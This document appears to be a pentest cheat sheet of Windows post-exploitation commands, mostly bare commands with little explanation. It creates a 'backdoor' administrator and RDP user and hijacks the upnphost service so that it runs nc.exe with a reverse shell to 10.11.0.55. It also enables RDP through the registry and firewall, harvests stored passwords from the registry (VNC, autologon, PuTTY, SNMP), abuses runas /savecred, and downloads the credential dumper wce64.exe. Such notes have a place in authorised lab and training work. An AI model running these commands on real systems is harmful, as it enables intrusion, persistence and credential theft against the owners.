
## Windows commands:

`whoami`

`systeminfo | findstr /B "OS"` 

`ipconfig /all`

`netstat -an`

`route print`

`net start`

`tasklist /V`

`net user`

`net user bob`

`net use`

`net share`

`net view`

### Add user
`net user backdoor backdoor123 /add`

### Add user to Administrator group
`net localgroup Administrators backdoor /add`

### Add user to remotedesktop
`net localgroup "Remote Desktop Users" backdoor /add`

### Check Administrators
`net localgroup Administrators`

### Get directory permission

`cacls Music`

or

`icacls Music`

`accesschk.exe -uwcqv "Authenticated Users" *`

`accesschk.exe /accepteula -uwdqs "Users" c:\`

` accesschk.exe -ucqv SSDPSRV`

This command shows which Windows services members of the Users group have write access to:

`accesschk users -cw \*`

`sc qc upnphost`

`sc config upnphost binpath= "C:\Inetpub\scripts\nc.exe 10.11.0.55 1234 -e C:\WINDOWS\System32\cmd.exe"`

`sc config upnphost obj= ".\LocalSystem" password= ""`

`sc qc upnphost`

### remove the dependency:

`$ sc config upnphost depend= ""`



windows service requires the executable to send back some feedback call within 30 seconds after a service had started. Or else, it will considered it as failed start attempt and terminate the service.

there are few workarounds on this, the easiest way is simply wrap your command in cmd.exe. i.e, cmd.exe /k <ur command>.

### RDP Enable

We can enable remote desktop from windows command line by running the following command:

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
net start termservice


reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 


### Look for password in registry

#### VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

#### Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

#### SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

#### Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

#### Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

### runas
runas /user:DOMAIN\user cmd.exe

runas /savecred /user:access\administrator "cmd /c type c:\users\administrator\desktop\root.txt > c:\users\security\y.txt"


#### check files in directories

tree /f /a

#### File Download

powershell -command "& { (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/wce64.exe', 'c:\HFS\wce64.exe')}"

